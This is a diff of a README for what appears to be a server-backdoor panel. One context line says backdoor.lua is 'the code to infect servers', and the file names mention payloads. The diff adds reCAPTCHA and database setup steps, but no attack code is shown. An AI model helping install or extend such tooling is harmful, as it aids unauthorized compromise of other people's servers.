@@ -9,16 +9,18 @@ backdoor.lua : The file that contain the code to infect servers |Can sometimes s
  https://discord.gg/SzSFeNc
 
 # Installation Process | Files
+Before Starting be sure to get keys for RecaptchaV2 https://www.google.com/recaptcha/
+
+open index.html and change Captcha Keys 
 
 open main.php and change Database settings and the others options if you want
+                         Captcha Keys
 
 open class/Config.php and change Database settings
 
-open deletepayload.php and change Database settings
 
-open send_payload_update.php and change Database settings
-
-open install folder and change Database settings
+open install folder and change Database settings in register.php
+                               captcha keys in index.html and register.php
 
 open phpMyAdmin and execute Kermini-s-q-l.sql 
 
